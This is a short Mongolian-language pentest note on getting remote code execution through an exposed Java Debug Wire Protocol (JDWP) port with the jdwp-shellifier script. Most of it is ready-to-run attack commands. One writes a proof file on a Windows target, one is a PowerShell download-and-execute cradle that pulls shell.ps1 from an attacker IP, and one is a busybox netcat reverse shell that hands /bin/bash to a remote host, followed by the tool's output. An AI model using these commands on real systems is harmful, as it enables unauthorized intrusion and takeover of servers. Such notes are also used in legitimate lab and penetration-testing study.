# JDWP (Java Debug Wire Protocol)

**JDWP (Java Debug Wire Protocol)** нь хөгжүүлэгчид програмыг засах (debug) зорилгоор ашигладаг боловч, хэрэв гадны хүн холбогдож чадвал **шууд RCE** авах боломжтой маш аюултай протокол юм.

### Яагаад энэ эмзэг гэж?

JDWP нь ажиллаж байгаа Java процесс руу дурын класс ачаалах, хувьсагчийн утгыг өөрчлөх, болон Java кодыг шууд ажиллуулах боломжийг олгодог. Энд ямар ч нууц үг эсвэл нэвтрэх эрх шаардлагагүй (default тохиргоогоор).

### 1. JDWP-shellifier ашиглах

Энэ бол хамгийн түгээмэл ашиглагддаг скрипт юм.

1. Скриптийг татаж авах: `git clone https://github.com/IOActive/jdwp-shellifier.git`
2. Команд ажиллуулах (Windows сервер дээр файл үүсгэх туршилт)

```bash
python2 jdwp-shellifier.py --target 192.168.153.150 --port 8000 --command "cmd /c echo RCE_SUCCESS > C:\Windows\Temp\pwned.txt"
```

### 2. Reverse Shell авах

```bash
python2 jdwp-shellifier.py --target 192.168.153.150 --port 8000 --command "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://ЧИНИЙ_IP/shell.ps1')\""
```

**АЖИЛЛУУЛАХ ҮЕД ИНГЭЭД Л БАЙГААД БАЙВАЛ:**

**Break Event** буюу тухайн программ дээр ямар нэгэн үйлдэл болохыг хүлээж байна гэсэн үг. `jdwp-shellifier` нь кодыг шууд хүчээр ажиллуулдаггүй, харин тухайн функцийг (энэ тохиолдолд `ServerSocket.accept`) дуудагдах үед нь "амдаж" аваад кодоо шахдаг.

```bash
python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "busybox nc 192.168.45.249 4545 -e /bin/bash"
[+] Targeting '127.0.0.1:8000'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.16'
[+] Found Runtime class: id=861
[+] Found Runtime.getRuntime(): id=7f3978342280
[+] Created break event id=2
[+] Waiting for an event on 'java.net.ServerSocket.accept'
```
